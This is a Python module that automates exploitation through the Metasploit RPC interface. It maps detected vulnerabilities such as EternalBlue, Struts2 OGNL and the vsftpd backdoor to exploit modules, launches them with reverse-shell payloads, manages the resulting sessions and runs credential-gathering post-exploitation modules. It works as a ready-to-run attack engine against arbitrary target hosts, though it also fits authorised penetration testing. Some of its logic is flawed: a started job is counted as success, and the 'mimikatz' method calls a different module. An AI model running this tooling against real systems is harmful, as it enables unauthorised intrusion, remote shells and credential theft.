"""
integrations/metasploit_rpc.py - Metasploit Framework RPC Integration

Provides integration with Metasploit Framework via RPC for:
- Auto-exploitation based on detected vulnerabilities
- Payload generation and delivery
- Session management and post-exploitation
- Result aggregation and reporting
"""

import json
import time
import logging
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import xmlrpc.client
import threading

logger = logging.getLogger(__name__)


class ExploitStatus(Enum):
    """Status of exploit attempts"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    ERROR = "error"


class SessionType(Enum):
    """Types of Metasploit sessions"""
    SHELL = "shell"
    METERPRETER = "meterpreter"
    POWERSHELL = "powershell"
    PYTHON = "python"
    PHP = "php"


@dataclass
class ExploitAttempt:
    """Record of an exploit attempt"""
    attempt_id: str
    target: str
    exploit_module: str
    payload: str
    status: ExploitStatus = ExploitStatus.PENDING
    session_id: Optional[int] = None
    result: Optional[str] = None
    error: Optional[str] = None
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    options: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SessionInfo:
    """Information about an active session"""
    session_id: int
    session_type: SessionType
    target_host: str
    target_port: int
    exploit_module: str
    payload: str
    user_name: Optional[str] = None
    computer_name: Optional[str] = None
    platform: Optional[str] = None
    created_at: float = 0.0
    last_interaction: float = 0.0


class MetasploitRPC:
    """
    Integration with Metasploit Framework via XML-RPC.
    
    Features:
    - Connect to Metasploit RPC server
    - Launch exploits against targets
    - Manage active sessions
    - Execute post-exploitation modules
    - Retrieve exploit results
    """
    
    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        username: str = "msf",
        password: str = "",
        ssl: bool = False,
        timeout: int = 30,
    ):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.timeout = timeout
        self.ssl = ssl
        
        # RPC client
        self.client: Optional[xmlrpc.client.ServerProxy] = None
        self.token: Optional[str] = None
        
        # Session tracking
        self.sessions: Dict[int, SessionInfo] = {}
        self.exploit_attempts: Dict[str, ExploitAttempt] = {}
        
        # Callbacks
        self._on_session_opened: Optional[callable] = None
        self._on_exploit_complete: Optional[callable] = None
        
        # Statistics
        self.stats = {
            'exploits_launched': 0,
            'exploits_succeeded': 0,
            'exploits_failed': 0,
            'sessions_active': 0,
            'sessions_closed': 0,
        }
        
        # Connection state
        self.connected = False
    
    def connect(self) -> bool:
        """Connect to Metasploit RPC server"""
        try:
            protocol = "https" if self.ssl else "http"
            url = f"{protocol}://{self.host}:{self.port}"
            
            self.client = xmlrpc.client.ServerProxy(url, allow_none=True)
            
            # Authenticate
            result = self.client.auth.login(self.username, self.password)
            
            if result.get('result') == 'success':
                self.token = result.get('token')
                self.connected = True
                logger.info(f"Connected to Metasploit RPC at {url}")
                return True
            else:
                logger.error(f"Failed to authenticate with Metasploit RPC: {result}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to connect to Metasploit RPC: {e}")
            return False
    
    def disconnect(self):
        """Disconnect from Metasploit RPC server"""
        if self.client and self.token:
            try:
                self.client.auth.logout(self.token)
            except:
                pass
        self.connected = False
        self.token = None
        logger.info("Disconnected from Metasploit RPC")
    
    def _call(self, method: str, *args) -> Dict:
        """Make an RPC call with authentication token"""
        if not self.connected or not self.token:
            return {'error': 'Not connected'}
        
        try:
            rpc_method = getattr(self.client, method)
            return rpc_method(self.token, *args)
        except Exception as e:
            logger.error(f"RPC call {method} failed: {e}")
            return {'error': str(e)}
    
    def get_core_version(self) -> str:
        """Get Metasploit core version"""
        result = self._call('core.version')
        return result.get('version', 'unknown')
    
    def get_msf_version(self) -> str:
        """Get Metasploit framework version"""
        result = self._call('msf.version')
        return result.get('version', 'unknown')
    
    def stop(self):
        """Stop the Metasploit RPC server"""
        return self._call('core.stop')
    
    # Module Management
    def get_exploits(self) -> List[str]:
        """Get list of available exploit modules"""
        result = self._call('module.exploits')
        return result.get('modules', [])
    
    def get_payloads(self) -> List[str]:
        """Get list of available payloads"""
        result = self._call('module.payloads')
        return result.get('modules', [])
    
    def get_auxiliary(self) -> List[str]:
        """Get list of available auxiliary modules"""
        result = self._call('module.auxiliary')
        return result.get('modules', [])
    
    def get_post(self) -> List[str]:
        """Get list of available post-exploitation modules"""
        result = self._call('module.post')
        return result.get('modules', [])
    
    def module_info(self, module_type: str, module_name: str) -> Dict:
        """Get information about a module"""
        result = self._call(f'module.{module_type}', module_name)
        return result
    
    # Exploit Execution
    def execute_exploit(
        self,
        target: str,
        exploit_module: str,
        payload: str,
        options: Dict[str, Any] = None,
        verbose: bool = False,
    ) -> ExploitAttempt:
        """
        Execute an exploit against a target.
        
        Args:
            target: Target host (IP or hostname)
            exploit_module: Full module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
            payload: Payload to use (e.g., 'windows/meterpreter/reverse_tcp')
            options: Additional module options
            verbose: Enable verbose output
            
        Returns:
            ExploitAttempt object with results
        """
        attempt_id = hashlib.md5(f"{target}:{exploit_module}:{time.time()}".encode()).hexdigest()[:12]
        
        attempt = ExploitAttempt(
            attempt_id=attempt_id,
            target=target,
            exploit_module=exploit_module,
            payload=payload,
            options=options or {},
        )
        
        self.exploit_attempts[attempt_id] = attempt
        self.stats['exploits_launched'] += 1
        
        attempt.start_time = time.time()
        attempt.status = ExploitStatus.RUNNING
        
        try:
            # Build module options
            module_options = {
                'RHOSTS': target,
                'TARGET': options.get('TARGET', 0),
            }
            
            # Add payload options
            if payload:
                module_options['PAYLOAD'] = payload
                
                # Set LHOST for reverse payloads
                if 'reverse' in payload:
                    module_options['LHOST'] = options.get('LHOST', self.host)
                    module_options['LPORT'] = options.get('LPORT', 4444)
            
            # Add custom options
            if options:
                for key, value in options.items():
                    if key not in ['LHOST', 'LPORT', 'TARGET']:
                        module_options[key] = value
            
            # Execute the exploit
            result = self._call('module.execute', 'exploit', exploit_module, module_options)
            
            if result.get('job_id'):
                attempt.result = f"Job started: {result.get('job_id')}"
                attempt.status = ExploitStatus.SUCCESS
                self.stats['exploits_succeeded'] += 1
                
                # Wait for session if verbose
                if verbose:
                    session = self._wait_for_session(attempt_id)
                    if session:
                        attempt.session_id = session.session_id
                        logger.info(f"Exploit succeeded, got session {session.session_id}")
            else:
                attempt.status = ExploitStatus.FAILED
                attempt.error = result.get('error', 'Unknown error')
                self.stats['exploits_failed'] += 1
                
        except Exception as e:
            attempt.status = ExploitStatus.ERROR
            attempt.error = str(e)
            self.stats['exploits_failed'] += 1
            logger.error(f"Exploit execution failed: {e}")
        
        attempt.end_time = time.time()
        
        if self._on_exploit_complete:
            self._on_exploit_complete(attempt)
        
        return attempt
    
    def _wait_for_session(self, attempt_id: str, timeout: float = 30.0) -> Optional[SessionInfo]:
        """Wait for a session to be created after exploit"""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            sessions = self.list_sessions()
            
            for session in sessions:
                # Check if this session is from our exploit (simplified check)
                if session.last_interaction > start_time:
                    return session
            
            time.sleep(1.0)
        
        return None
    
    def execute_auxiliary(
        self,
        target: str,
        module_name: str,
        options: Dict[str, Any] = None,
    ) -> Dict:
        """Execute an auxiliary module"""
        module_options = {
            'RHOSTS': target,
        }
        
        if options:
            module_options.update(options)
        
        result = self._call('module.execute', 'auxiliary', module_name, module_options)
        return result
    
    # Session Management
    def list_sessions(self) -> List[SessionInfo]:
        """List all active sessions"""
        result = self._call('session.list')
        sessions = []
        
        for session_data in result.get('sessions', []):
            session = SessionInfo(
                session_id=session_data['id'],
                session_type=SessionType(session_data.get('type', 'shell')),
                target_host=session_data.get('target_host', ''),
                target_port=session_data.get('target_port', 0),
                exploit_module=session_data.get('exploit_module', ''),
                payload=session_data.get('payload', ''),
                user_name=session_data.get('username'),
                computer_name=session_data.get('computer_name'),
                platform=session_data.get('platform'),
                created_at=session_data.get('created_at', 0),
                last_interaction=session_data.get('last_interaction', 0),
            )
            sessions.append(session)
            self.sessions[session.session_id] = session
        
        self.stats['sessions_active'] = len(sessions)
        return sessions
    
    def session_read(self, session_id: int) -> str:
        """Read output from a session"""
        result = self._call('session.session_read', session_id)
        return result.get('data', '')
    
    def session_write(self, session_id: int, data: str):
        """Write to a session"""
        return self._call('session.session_write', session_id, data)
    
    def session_kill(self, session_id: int) -> bool:
        """Kill a session"""
        result = self._call('session.session_kill', session_id)
        if result.get('result') == 'success':
            if session_id in self.sessions:
                del self.sessions[session_id]
            self.stats['sessions_closed'] += 1
            return True
        return False
    
    def session_ring(self, session_id: int) -> List[str]:
        """Get session command history"""
        result = self._call('session.session_ring', session_id)
        return result.get('cmd', [])
    
    # Post-Exploitation
    def execute_post(
        self,
        session_id: int,
        module_name: str,
        options: Dict[str, Any] = None,
    ) -> Dict:
        """Execute a post-exploitation module on a session"""
        module_options = {
            'SESSION': session_id,
        }
        
        if options:
            module_options.update(options)
        
        result = self._call('module.execute', 'post', module_name, module_options)
        return result
    
    def run_mimikatz(self, session_id: int) -> str:
        """Run mimikatz on a Windows session"""
        return self.execute_post(session_id, 'windows/gather/credentials/windows_local')
    
    def enumerate_local_accounts(self, session_id: int) -> str:
        """Enumerate local accounts on a session"""
        return self.execute_post(session_id, 'multi/recon/local_exploit_suggester')
    
    def check_privilege_escalation(self, session_id: int) -> List[str]:
        """Check for privilege escalation vectors"""
        result = self.execute_post(session_id, 'multi/recon/local_exploit_suggester')
        suggestions = []
        
        if 'data' in result:
            for line in result['data'].split('\n'):
                if 'Session' in line or 'Suggest' in line:
                    suggestions.append(line.strip())
        
        return suggestions
    
    # Job Management
    def list_jobs(self) -> List[Dict]:
        """List running jobs"""
        result = self._call('job.list')
        return result.get('jobs', [])
    
    def job_stop(self, job_id: int) -> bool:
        """Stop a job"""
        result = self._call('job.stop', job_id)
        return result.get('result') == 'success'
    
    def job_kill_all(self):
        """Kill all jobs"""
        return self._call('job.kill_all')
    
    # Database
    def db_hosts(self) -> List[Dict]:
        """Get hosts from database"""
        result = self._call('db.hosts')
        return result.get('hosts', [])
    
    def db_services(self) -> List[Dict]:
        """Get services from database"""
        result = self._call('db.services')
        return result.get('services', [])
    
    def db_vulns(self) -> List[Dict]:
        """Get vulnerabilities from database"""
        result = self._call('db.vulns')
        return result.get('vulns', [])
    
    def db_cred(self) -> List[Dict]:
        """Get credentials from database"""
        result = self._call('db.cred')
        return result.get('cred', [])
    
    # Statistics
    def get_stats(self) -> Dict:
        """Get statistics"""
        return {
            **self.stats,
            'active_sessions': len(self.sessions),
            'pending_exploits': sum(1 for a in self.exploit_attempts.values() if a.status == ExploitStatus.PENDING),
            'running_exploits': sum(1 for a in self.exploit_attempts.values() if a.status == ExploitStatus.RUNNING),
        }
    
    def export_results(self, output_path: str):
        """Export exploit results to JSON"""
        data = {
            'exploit_attempts': [
                {
                    'attempt_id': a.attempt_id,
                    'target': a.target,
                    'exploit_module': a.exploit_module,
                    'payload': a.payload,
                    'status': a.status.value,
                    'session_id': a.session_id,
                    'result': a.result,
                    'error': a.error,
                    'start_time': a.start_time,
                    'end_time': a.end_time,
                    'options': a.options,
                }
                for a in self.exploit_attempts.values()
            ],
            'sessions': [
                {
                    'session_id': s.session_id,
                    'session_type': s.session_type.value,
                    'target_host': s.target_host,
                    'target_port': s.target_port,
                    'user_name': s.user_name,
                    'platform': s.platform,
                }
                for s in self.sessions.values()
            ],
            'stats': self.get_stats(),
        }
        
        with open(output_path, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Exported Metasploit results to {output_path}")


class AutoExploiter:
    """
    Automated exploitation engine using Metasploit RPC.
    
    Features:
    - Auto-select exploits based on detected vulnerabilities
    - Chain multiple exploits together
    - Manage exploitation campaigns
    """
    
    def __init__(self, msf_rpc: MetasploitRPC):
        self.msf = msf_rpc
        
        # Exploit mapping (CVE/service -> exploit module)
        self.exploit_map = {
            # Windows SMB
            'ms17_010': 'exploit/windows/smb/ms17_010_eternalblue',
            'ms17_010_eternalblue': 'exploit/windows/smb/ms17_010_eternalblue',
            
            # Web applications
            'tomcat_mgr_upload': 'exploit/multi/http/tomcat_mgr_upload',
            'jboss_main_deployer': 'exploit/multi/http/jboss_main_deployer',
            'struts2_content_type_ognl': 'exploit/multi/http/struts2_content_type_ognl',
            
            # Linux services
            'vsftpd_backdoor': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'distccd_exec': 'exploit/multi/misc/distccd_exec',
            
            # Database
            'mysql_sqli': 'exploit/multi/mysql/mysql_sqli',
            'postgres_payload': 'exploit/multi/postgres/postgres_payload',
        }
        
        # Payload mapping (platform -> default payload)
        self.payload_map = {
            'windows': 'windows/meterpreter/reverse_tcp',
            'linux': 'linux/x86/meterpreter/reverse_tcp',
            'unix': 'cmd/unix/reverse',
            'java': 'java/jspshell_reverse_tcp',
            'php': 'php/meterpreter/reverse_tcp',
        }
    
    def auto_exploit(
        self,
        target: str,
        vulnerabilities: List[Dict],
        platform: str = None,
    ) -> List[ExploitAttempt]:
        """
        Automatically exploit detected vulnerabilities.
        
        Args:
            target: Target host
            vulnerabilities: List of vulnerability dicts with 'id' or 'cve' keys
            platform: Target platform (windows, linux, etc.)
            
        Returns:
            List of ExploitAttempt objects
        """
        attempts = []
        
        for vuln in vulnerabilities:
            vuln_id = vuln.get('id', vuln.get('cve', '')).lower()
            
            # Find matching exploit
            exploit_module = None
            for key, module in self.exploit_map.items():
                if key in vuln_id:
                    exploit_module = module
                    break
            
            if not exploit_module:
                logger.debug(f"No exploit found for vulnerability: {vuln_id}")
                continue
            
            # Select payload
            payload = self.payload_map.get(platform, 'windows/meterpreter/reverse_tcp')
            
            # Execute exploit
            attempt = self.msf.execute_exploit(
                target=target,
                exploit_module=exploit_module,
                payload=payload,
                verbose=True,
            )
            
            attempts.append(attempt)
            
            # Stop if successful
            if attempt.status == ExploitStatus.SUCCESS:
                logger.info(f"Successfully exploited {target} with {exploit_module}")
                break
        
        return attempts
    
    def exploit_chain(
        self,
        target: str,
        exploit_sequence: List[Tuple[str, str]],
    ) -> List[ExploitAttempt]:
        """
        Execute a chain of exploits.
        
        Args:
            target: Target host
            exploit_sequence: List of (exploit_module, payload) tuples
            
        Returns:
            List of ExploitAttempt objects
        """
        attempts = []
        
        for exploit_module, payload in exploit_sequence:
            attempt = self.msf.execute_exploit(
                target=target,
                exploit_module=exploit_module,
                payload=payload,
                verbose=True,
            )
            
            attempts.append(attempt)
            
            # Continue chain even if failed
            if attempt.status != ExploitStatus.SUCCESS:
                logger.warning(f"Exploit {exploit_module} failed, continuing chain")
        
        return attempts


# Convenience function
def connect_metasploit(
    host: str = "127.0.0.1",
    port: int = 55553,
    password: str = "",
) -> Optional[MetasploitRPC]:
    """
    Connect to Metasploit RPC server.
    
    Returns:
        MetasploitRPC instance or None if connection failed
    """
    msf = MetasploitRPC(host=host, port=port, password=password)
    if msf.connect():
        return msf
    return None